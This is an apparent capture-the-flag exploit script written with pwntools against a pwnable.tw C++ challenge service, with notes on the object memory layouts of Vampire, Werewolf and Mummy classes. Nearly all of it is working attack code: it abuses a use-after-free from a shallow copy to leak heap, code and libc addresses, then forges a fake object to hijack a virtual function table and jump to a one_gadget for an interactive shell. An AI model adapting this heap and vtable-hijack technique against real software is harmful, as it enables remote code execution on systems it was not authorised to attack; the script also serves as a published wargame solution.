from pwn import *

'''
<c++ string>{
    chr* data;
    int64 size;
    union{
        chr[16] buf;
        int64 capacity; NULL;
    }
}

Vampire (0x68)
    |       8       |       8       |
0x00| vftable(void*)|    age(int)   |
0x10|  name(chr*)   |  type<string> |
0x20|  type<string> |  type<string> |
0x30|  type<string> |  msg<string>  |
0x40|  msg<string>  |  msg<string>  |
0x50|  msg<string>  |  blood(chr*)  |
0x60|      NULL     |

Werewolf (0x68)
    |       8       |       8       |
0x00| vftable(void*)|    age(int)   |
0x10|  name(chr*)   |  type<string> |
0x20|  type<string> |  type<string> |
0x30|  type<string> |  msg<string>  |
0x40|  msg<string>  |  msg<string>  |
0x50|  msg<string>  | trans |  NULL |
0x60|      NULL     |

Mummy (0x78)
    |       8       |       8       |
0x00| vftable(void*)|    age(int)   |
0x10|  name(chr*)   |  type<string> |
0x20|  type<string> |  type<string> |
0x30|  type<string> |  msg<string>  |
0x40|  msg<string>  |  msg<string>  |
0x50|  msg<string>  |bandage<string>|
0x60|bandage<string>|bandage<string>|
0x70|bandage<string>|

'''

###Utils
def create(name,age,msg,Type,additional,mode='plain'):
    r.sendlineafter('choice :','1')
    r.sendlineafter('Name : ',name)
    r.sendlineafter('Age : ',str(age))
    r.sendlineafter('Message : ',msg)
    if Type=='Vampire':
        r.sendlineafter('ghost :','7')
        r.sendlineafter('blood :',additional)
    elif Type=='Mummy':
        r.sendlineafter('ghost :','5')
        r.sendlineafter('bandage : ',additional)
    elif Type=='Werewolf':
        r.sendlineafter('ghost :','1')
        r.sendlineafter('(1:yes/0:no):',str(additional))
    if mode=='plain':
        r.sendlineafter('choice : ','1')
    elif mode=='delete':
        r.sendlineafter('choice : ','3')

def show(idx):
    r.sendlineafter('choice :','2')
    r.sendlineafter('party : ',str(idx))
    return r.recvuntil('§')[:-2]

def delete(idx):
    r.sendlineafter('choice :','4')
    r.sendlineafter('party : ',str(idx))

###Addr
#  libc2.23
werewolf_vtable_offset = 0x210b98
read_got = 0x210e88
read_offset = 0xf6670
one_gadget = 0xef6c4

###Exploit
r = remote('chall.pwnable.tw',10401)

###Leak addr
#  Assignment operator not set for Vampire
#  speaking() triggers copy constructer(default shallow copy) for class
#  causes the blood buffer to be freed automatically
create('M30W',0,'M30W','Vampire','a'*0x67,'delete')
heap = u64(show(0).split(b'Blood : ')[1][:-2].ljust(8,b'\x00'))-0x12dc0

#  assigning a buffer same size of Werewolf forces the new object to be malloced onto Vampire blood buffer
#  This helps leaks code_base with virtual function table
create('M30W',0,'M30W','Werewolf',0,'plain')
werewolf_vtable_addr = u64(show(0).split(b'Blood : ')[1][:-2].ljust(8,b'\x00'))
code_base = werewolf_vtable_addr-werewolf_vtable_offset

#  creat a fake werewolf block mapped to werewolf entry to leak arbitrary address
delete(0)
fake_werewolf_block  = p64(code_base+werewolf_vtable_offset)
fake_werewolf_block += p64(0)
fake_werewolf_block += p64(code_base+read_got)
fake_werewolf_block += p64(0)+p64(0)+p64(0)+p64(0)
fake_werewolf_block += p64(0)+p64(0)+p64(0)+p64(0)
fake_werewolf_block += p64(0)
fake_werewolf_block  = fake_werewolf_block[:0x67]
create('M30W',0,'M30W','Mummy',fake_werewolf_block,'plain')
read_addr = u64(show(0).split(b' : ')[2][:-4].ljust(8,b'\x00'))
libc_base = read_addr-read_offset

#  repeat the vampire procedure and hijack vtable to call one_gadget
#  heap offset is obtained through leaking ghostlist vector entries
delete(1)
create('M30W',0,'M30W','Werewolf',0,'plain')
create('M30W',0,'M30W','Vampire','a'*0x67,'delete')
create('M30W',0,'M30W','Werewolf',0,'plain')
delete(2)
fake_werewolf_block  = p64(heap+0x13000)
fake_werewolf_block += p64(0)
fake_werewolf_block += p64(libc_base+one_gadget)
fake_werewolf_block += p64(0)+p64(0)+p64(0)+p64(0)
fake_werewolf_block += p64(0)+p64(0)+p64(0)+p64(0)
fake_werewolf_block += p64(0)
fake_werewolf_block  = fake_werewolf_block[:0x67]
create('M30W',0,'M30W','Mummy',fake_werewolf_block,'plain')

r.sendlineafter('choice :','2')
r.sendlineafter('party : ','2')
r.interactive()

###Reference
#  c++ exploitation
#   https://www.slideshare.net/AngelBoy1/pwning-in-c-basic
